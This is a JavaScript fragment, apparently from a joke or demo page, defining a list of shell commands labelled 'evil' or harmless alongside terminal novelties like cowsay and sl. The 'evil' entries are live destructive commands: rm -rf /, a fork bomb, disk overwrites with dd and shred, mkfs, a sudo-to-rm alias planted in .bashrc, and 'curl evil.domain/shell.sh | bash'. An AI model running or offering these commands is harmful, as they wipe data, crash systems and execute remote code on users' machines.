...
(function () {
  ...
  var DEFAULT_COMMANDS = [
    { call: 'rm -rf / --no-preserve-root', desc: 'Recursive inode destruction from root mountpoint', evil: true },
    { call: ':(){ :|:& };:', desc: 'Fork bomb via recursive bash function', evil: true },
    { call: 'dd if=/dev/urandom of=/dev/sda bs=4M', desc: 'Overwrite block device with random bytes', evil: true },
    { call: 'chmod -R 000 /', desc: 'Recursively remove all permissions', evil: true },
    { call: 'cat /dev/urandom > /dev/mem', desc: 'Inject entropy directly into RAM', evil: true },
    { call: 'echo c > /proc/sysrq-trigger', desc: 'Magic SysRq kernel crash handler', evil: true },
    { call: 'kill -9 1', desc: 'Terminate init process', evil: true },
    { call: 'shred -vfz -n 35 /dev/sda', desc: '35-pass secure erase on block device', evil: true },
    { call: 'curl evil.domain/shell.sh | bash', desc: 'Blindly execute remote shell script', evil: true },
    { call: 'chmod 777 /etc/sudoers', desc: 'Make sudoers world-writable', evil: true },
    { call: 'cat /dev/urandom | hexdump -C | grep "ca fe ba be"', desc: 'Search for Java magic bytes in entropy stream', evil: false },
    { call: 'cmatrix -b -C green', desc: 'Matrix digital rain in terminal', evil: false },
    { call: 'toilet -f mono12 -F metal "HACKED"', desc: 'ASCII art banner with metal filter', evil: false },
    { call: 'figlet -c "System Compromised" | lolcat', desc: 'Rainbow ASCII banner', evil: false },
    { call: 'cowsay "I am the kernel, fear me"', desc: 'Kernel threat via ASCII cow', evil: false },
    { call: 'stress-ng --cpu 0 --io 0 --vm 0 --timeout 0', desc: 'Permanently exhaust all resources', evil: false },
    { call: 'while true; do rm -rf /*; done', desc: 'Infinite loop deleting root filesystem', evil: true },
    { call: 'mv /usr/bin/sudo /usr/bin/please', desc: 'Rename sudo to please', evil: true },
    { call: 'echo "alias sudo=rm -rf /" >> ~/.bashrc', desc: 'Replace sudo alias with rm -rf', evil: true },
    { call: 'pkill -9 -u root', desc: 'Terminate all root processes', evil: true },
    { call: 'aafire', desc: 'ASCII fire animation in terminal', evil: false },
    { call: 'telnet towel.blinkenlights.nl', desc: 'Star Wars ASCII via Telnet', evil: false },
    { call: 'cat /dev/input/mice | hexdump', desc: 'Stream mouse input as hex dump', evil: false },
    { call: 'asciiquarium', desc: 'ASCII aquarium in terminal', evil: false },
    { call: 'mkfs.ext4 /dev/sda1', desc: 'Reformat primary partition', evil: true },
    { call: 'echo "export PATH=/dev/null" >> /etc/profile', desc: 'Redirect global PATH to null', evil: true },
    { call: 'chmod 000 /usr/bin/chmod', desc: 'Apply chmod on itself', evil: true },
    { call: 'iptables -P INPUT DROP && iptables -P OUTPUT DROP', desc: 'Block all network traffic', evil: true },
    { call: 'rev <<< "Your system is now mine"', desc: 'Output threat in reverse', evil: false },
    { call: 'sl', desc: 'Steam locomotive for ls typos', evil: false },
  ];
